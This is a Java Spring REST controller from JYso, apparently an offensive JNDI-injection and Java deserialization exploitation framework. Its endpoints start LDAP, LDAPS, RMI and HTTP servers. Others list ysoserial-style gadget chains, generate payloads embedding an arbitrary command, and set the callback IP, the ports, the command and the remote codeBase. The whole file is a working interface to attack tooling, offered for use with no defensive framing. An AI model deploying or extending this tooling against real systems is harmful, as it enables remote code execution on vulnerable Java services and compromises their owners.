package com.qi4l.JYso.web.controller;

import com.qi4l.JYso.HTTPServer;
import com.qi4l.JYso.LdapServer;
import com.qi4l.JYso.LdapsServer;
import com.qi4l.JYso.RMIServer;
import com.qi4l.JYso.Starter;
import com.qi4l.JYso.gadgets.Config.Config;
import com.qi4l.JYso.gadgets.Config.ysoserial;
import com.qi4l.JYso.gadgets.ObjectPayload;
import org.springframework.web.bind.annotation.*;

import java.util.*;

@RestController
@RequestMapping("/api")
public class ApiController {

    @GetMapping("/status")
    public Map<String, Object> getStatus() {
        Map<String, Object> status = new LinkedHashMap<>();
        status.put("ldapRunning", LdapServer.isRunning);
        status.put("ldapsRunning", LdapsServer.isRunning);
        status.put("httpRunning", HTTPServer.isRunning);
        status.put("rmiRunning", RMIServer.isRunning);
        status.put("ip", Config.ip);
        status.put("ldapPort", Config.ldapPort);
        status.put("ldapsPort", Config.ldapsPort);
        status.put("httpPort", Config.httpPort);
        status.put("rmiPort", Config.rmiPort);
        status.put("codeBase", Config.codeBase);
        status.put("version", "1.3.7");
        return status;
    }

    @PostMapping("/servers/start")
    public Map<String, Object> startServers(@RequestBody Map<String, Object> body) {
        Map<String, Object> result = new LinkedHashMap<>();
        List<String> started = new ArrayList<>();
        List<String> errors = new ArrayList<>();

        boolean startLdap = body.get("ldap") != null && Boolean.TRUE.equals(body.get("ldap"));
        boolean startLdaps = body.get("ldaps") != null && Boolean.TRUE.equals(body.get("ldaps"));
        boolean startHttp = body.get("http") != null && Boolean.TRUE.equals(body.get("http"));
        boolean startRmi = body.get("rmi") != null && Boolean.TRUE.equals(body.get("rmi"));

        if (body.containsKey("ip")) Config.ip = (String) body.get("ip");
        if (body.containsKey("ldapPort")) Config.ldapPort = (Integer) body.get("ldapPort");
        if (body.containsKey("ldapsPort")) Config.ldapsPort = (Integer) body.get("ldapsPort");
        if (body.containsKey("httpPort")) Config.httpPort = (Integer) body.get("httpPort");
        if (body.containsKey("rmiPort")) Config.rmiPort = (Integer) body.get("rmiPort");

        if (startLdap && !LdapServer.isRunning) {
            new Thread(() -> {
                try { LdapServer.start(); } catch (Exception ignored) {}
            }, "ldap-starter").start();
            started.add("LDAP");
        }
        if (startHttp && !HTTPServer.isRunning) {
            new Thread(() -> {
                try { HTTPServer.start(); } catch (Exception ignored) {}
            }, "http-starter").start();
            started.add("HTTP");
        }
        if (startLdaps && !LdapsServer.isRunning) {
            new Thread(() -> {
                try { LdapsServer.start(); } catch (Exception ignored) {}
            }, "ldaps-starter").start();
            started.add("LDAPS");
        }
        if (startRmi && !RMIServer.isRunning) {
            new Thread(() -> {
                try { RMIServer.start(); } catch (Exception ignored) {}
            }, "rmi-starter").start();
            started.add("RMI");
        }

        result.put("started", started);
        result.put("errors", errors);
        result.put("success", true);
        return result;
    }

    @GetMapping("/gadgets")
    public List<Map<String, Object>> listGadgets() {
        List<Map<String, Object>> list = new ArrayList<>();
        for (String name : Starter.caseInsensitiveObjectPayloadMap.keySet()) {
            Map<String, Object> item = new LinkedHashMap<>();
            String shortName = name.substring(name.lastIndexOf('.') + 1);
            item.put("name", shortName);
            item.put("fullName", name);
            list.add(item);
        }
        return list;
    }

    @PostMapping("/payload/generate")
    public Map<String, Object> generatePayload(@RequestBody Map<String, Object> body) {
        Map<String, Object> result = new LinkedHashMap<>();

        String gadget = (String) body.get("gadget");
        String command = (String) body.get("command");

        if (gadget == null || command == null) {
            result.put("success", false);
            result.put("error", "gadget and command are required");
            return result;
        }

        try {
            Starter.JYsoMode = true;
            String[] args = new String[]{
                    "-y",
                    "-g", gadget,
                    "-p", command
            };
            ysoserial.run(args);
            result.put("success", true);
            result.put("message", "Payload generated successfully");
        } catch (Exception e) {
            result.put("success", false);
            result.put("error", e.getMessage());
        }

        return result;
    }

    @PostMapping("/config/update")
    public Map<String, Object> updateConfig(@RequestBody Map<String, Object> body) {
        Map<String, Object> result = new LinkedHashMap<>();

        if (body.containsKey("ip")) Config.ip = (String) body.get("ip");
        if (body.containsKey("ldapPort")) Config.ldapPort = (Integer) body.get("ldapPort");
        if (body.containsKey("ldapsPort")) Config.ldapsPort = (Integer) body.get("ldapsPort");
        if (body.containsKey("httpPort")) Config.httpPort = (Integer) body.get("httpPort");
        if (body.containsKey("rmiPort")) Config.rmiPort = (Integer) body.get("rmiPort");
        if (body.containsKey("command")) Config.command = (String) body.get("command");
        if (body.containsKey("codeBase")) Config.codeBase = (String) body.get("codeBase");

        result.put("success", true);
        result.put("config", getStatus());
        return result;
    }

    @GetMapping("/config")
    public Map<String, Object> getConfig() {
        return getStatus();
    }
}
